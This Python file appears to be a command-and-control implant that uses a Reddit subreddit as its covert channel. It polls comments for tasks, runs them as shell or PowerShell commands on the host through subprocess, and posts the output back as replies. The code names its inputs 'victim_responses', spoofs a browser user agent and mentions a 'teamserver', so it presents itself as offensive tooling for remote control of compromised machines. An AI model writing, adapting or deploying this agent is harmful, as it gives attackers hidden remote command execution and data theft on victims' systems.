import praw
import string
import time
import os
import json
import subprocess

#read a post with a specific title
def readTask(username, password, subreddit_name, listenerID):
    victim_responses = []
  
    subreddit = reddit.subreddit(subreddit_name)
    resp = subreddit.search(listenerID, limit=10)

    for submission in resp:        
        #look only for comments which has our command in it
        submission.comments.replace_more(limit=None)
        for top_level_comment in submission.comments:
            if("in:" in top_level_comment.body):
                victim_responses.append(top_level_comment.body)
        
    #use recursion when no new reply is found
    if not victim_responses:
        print("[!] No task received, waiting for 5 seconds")
        time.sleep(5)
        return readTask(username, password, subreddit_name, listenerID)
        
    #there is a task in the array, return it
    else:
        response = victim_responses[0]
        print(response)
            
        if("powershell" in response):
           response = "powershell.exe " + response[15:]
         
        elif("run" in response):
            response = response[8:]
            
        print("[+] Received task to execute: " + response)
        return response

def sendOutput(command, output, username, password, subreddit_name, listenerID):
    #problem: output is empty for some reason
    subreddit = reddit.subreddit(subreddit_name)
    resp = subreddit.search(listenerID, limit=10)
    
    for submission in resp:
        submission.comments.replace_more(limit=None)
        for top_level_comment in submission.comments:
            if(command in top_level_comment.body):
                top_level_comment.reply("out: " + output)
                #edit the reply to executed (done in teamserver)
                #top_level_comment.edit("executed")
    
def runTask(command):
    output = subprocess.getoutput(command)
    return output

if __name__ == "__main__":
    #fill in the data with your credentials
    #-------------------------------------
    client_id = "myclientid"
    client_secret = "mysecretkey"
    username = "myusername"
    password = "mypassword"
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
    subreddit = "mysubreddit"
    listenerID = "listener_number";
    #-------------------------------------

    # creating an authorized reddit instance
    reddit = praw.Reddit(client_id = client_id,
                     client_secret = client_secret,
                     username = username,
                     password = password,
                     user_agent = user_agent)
                     
    reddit.validate_on_submit = True
    
    while True:
        time.sleep(5)
        command = readTask(username, password, subreddit, listenerID)
        output = runTask(command)
        sendOutput(command, output, username, password, subreddit, listenerID)
